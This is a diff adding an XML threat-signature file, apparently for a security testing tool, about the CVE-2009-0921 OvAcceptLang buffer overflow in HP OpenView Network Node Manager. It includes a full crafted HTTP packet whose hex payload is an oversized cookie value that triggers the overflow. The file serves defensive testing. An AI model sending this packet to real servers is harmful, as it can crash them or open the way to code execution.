@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HP OpenView Network Node Manager OvAcceptLang Parameter Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in HP OpenView Network Node Manager software. The vulnerability is due to a boundary error while processing specially crafted HTTP requests sent to the server. Remote attackers could exploit this vulnerability to inject and execute arbitrary code on the target server. In an attack case where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected process. In an attack case where code injection is not successful, only the instance of the affected process will terminate abnormally."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="HP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="HP_OpenView_Network_Node_Manager"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="HP_OpenView_Network_Node_Manager_7.01&amp;7.51&amp;7.53"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-0921"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="d76d11773a03473f57c3b6707fab8034"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633984771147790002"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1262773825" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:C0:30:A8" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="02DE" Identification="7581" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="60F8" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="60975" destPort="$HTTPdestPort" SeqNumber="A2A755B3" AckNumber="8DE5ACB1" HeaderLength="08" WindowSize="002E" Checksum="5B54" UrgentPointer="0000" Options="0101080ADB5F20CF00000000" Payload="474554202F4F764367692F546F6F6C6261722E65786520485454502F312E300D0A436F6F6B69653A204F764F534C6F63616C653D656E5F55533B204F764163636570744C616E673D656E2D7573614141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
